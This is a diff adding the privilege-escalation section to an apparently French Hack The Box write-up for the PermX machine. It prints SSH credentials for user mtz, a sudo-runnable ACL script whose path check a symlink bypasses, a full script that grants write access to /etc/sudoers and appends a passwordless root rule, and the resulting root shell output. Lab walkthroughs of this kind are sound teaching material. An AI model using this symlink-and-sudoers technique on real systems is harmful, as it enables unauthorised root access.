@@ -1016,8 +1016,23 @@ mtz@permx:/$ cat ~/user.txt
 
 ## Escalade de privilèges
 
-Une fois connecté en tant que `mtz`, tu appliques la méthodologie décrite dans la recette
-   {{< recette "privilege-escalation-linux" >}}.
+
+
+Les identifiants `mtz:03F6lY3uXAP2bkW8`, obtenus via l’exploitation des données de la base de données, permettent une connexion **SSH** en tant qu’utilisateur `mtz`, marquant le début de la phase d’**escalade de privilèges**.
+
+```bash
+ssh mtz@permx.htb   
+mtz@permx.htb's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
+
+Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
+mtz@permx:~$ 
+```
+
+
+
+Une fois connecté, tu appliques la méthodologie décrite dans la recette
+ {{< recette "privilege-escalation-linux" >}}.
 
 ### Sudo -l
 
@@ -1033,7 +1048,138 @@ User mtz may run the following commands on permx:
 
 ```
 
+La commande `sudo -l` indique que l’utilisateur `mtz` peut exécuter le script **`/opt/acl.sh`** en tant que **root**, sans mot de passe.
+ Ce script constitue donc un point d’entrée direct pour l’**escalade de privilèges**.
 
+### Analyse de /opt/acl.sh
+
+Tu poursuis l’analyse en examinant le script **`/opt/acl.sh`**, exécutable avec les privilèges root via `sudo`.
+
+```bash
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+
+```
+
+
+
+Le script `/opt/acl.sh` te permet d’ajouter des permissions **ACL** (*Access Control Lists*) sur un fichier placé sous `/home/mtz/`.
+ Les ACL servent à attribuer des droits précis (lecture, écriture, exécution) à un utilisateur donné, en complément des permissions Unix classiques.
+
+Par exemple, la commande suivante donne le droit d’écriture à l’utilisateur `mtz` sur un fichier sans en être le propriétaire :
+
+```
+setfacl -m u:mtz:rw fichier
+```
+
+Le script ne vérifie que la forme du chemin fourni, sans contrôler la destination réelle du fichier.
+ En utilisant un **lien symbolique**, tu peux donc faire pointer ce fichier vers une cible sensible du système.
+ Comme `setfacl` est exécuté avec les privilèges **root**, les permissions sont alors appliquées directement sur cette cible.
+
+Cette faiblesse est exploitée dans la suite pour obtenir une **élévation de privilèges**.
+
+> *Note : pour une présentation détaillée des ACL Linux (en français), voir la documentation Ubuntu-fr*
+>   https://doc.ubuntu-fr.org/acl
+
+
+
+### Exécution de l'escalade
+
+
+
+#### Choix du système système
+
+L’étape suivante consiste à choisir le **fichier système le plus pertinent** à cibler, afin d’exploiter efficacement cette possibilité de modification des ACL et d’aboutir à une élévation de privilèges fiable.
+
+Plusieurs fichiers système peuvent théoriquement être ciblés via la modification des ACL, comme `/etc/passwd`, `/root/.ssh/authorized_keys` ou `/etc/sudoers`.
+ Parmi ces options, **`/etc/sudoers`** est le choix le plus pertinent : il permet une élévation de privilèges **directe, contrôlée et réversible**, sans impacter la stabilité du système.
+
+**Nous allons donc exploiter cette possibilité en ciblant le fichier `/etc/sudoers` afin d’obtenir un accès root.**
+
+#### Script d'exécution
+
+En travaillant dans le répertoire personnel de `mtz`, tu constates rapidement qu’une **tâche cron** s’exécute régulièrement et supprime les **liens symboliques récemment créés** dans `/home/mtz`.
+ Pour contourner ce nettoyage automatique, une bonne approche consiste à regrouper toutes les étapes (création du lien symbolique, application des ACL, modification du fichier ciblé) dans un **script unique** `shell.sh`, que tu peux exécuter d’un seul tenant et relancer si nécessaire.
+
+
+
+```bash
+#!/bin/bash
+
+rm -f /home/mtz/sudoers_link
+ln -s /etc/sudoers /home/mtz/sudoers_link
+
+sudo /opt/acl.sh mtz rwx /home/mtz/sudoers_link
+
+echo "mtz ALL=(ALL) NOPASSWD: ALL" | tee -a /home/mtz/sudoers_link
+
+sudo -l
+
+sudo -i
+
+```
+
+Le script `shell.sh` automatise l’exploitation en une seule exécution afin de devancer le nettoyage par cron.
+ Il crée un lien symbolique vers `/etc/sudoers`, applique des **ACL en écriture** via `/opt/acl.sh`, puis ajoute une règle `sudo` autorisant `mtz` à exécuter des commandes **sans mot de passe**.
+
+La configuration est immédiatement validée avec `sudo -l`, avant d’obtenir un **shell root** à l’aide de `sudo -i`.
+
+
+
+```bash
+mtz@permx:~$nano shell.sh
+
+mtz@permx:~$ chmod +x shell.sh
+
+mtz@permx:~$ ./shell.sh
+
+mtz ALL=(ALL) NOPASSWD: ALL
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+    (ALL) NOPASSWD: ALL
+root@permx:~# whoami
+root
+root@permx:~#
+```
+
+### root.txt
+
+Il ne te reste alors plus qu’à lire le flag final avec la commande :
+
+```bash
+cat /root/root.txt
+```
+
+```bash
+root@permx:~# cat /root/root.txt
+0803xxxxxxxxxxxxxxxxxxxxxxxx24d0
+```
 
 
 
@@ -1046,6 +1192,56 @@ User mtz may run the following commands on permx:
 - Vulnérabilités exploitées & combinaisons.
 - Conseils de mitigation et détection.
 - Points d'apprentissage personnels.
+
+
+
+```bash
+cat reset.sh
+#!/bin/bash
+
+/usr/bin/cp /root/backup/passwd /etc/passwd
+/usr/bin/cp /root/backup/shadow /etc/shadow
+/usr/bin/cp /root/backup/sudoers /etc/sudoers
+/usr/bin/cp /root/backup/crontab /etc/crontab
+/usr/bin/setfacl -b /root/root.txt /etc/passwd /etc/shadow /etc/crontab /etc/sudoers
+
+/usr/bin/find /home/mtz -type l ! -name "user.txt" -mmin -3 -exec rm {} \;
+
+```
+
+
+
+```bash
+root@permx:~# crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/3 * * * * /root/reset.sh
+root@permx:~# 
+
+```
+
+
 
 ---
 
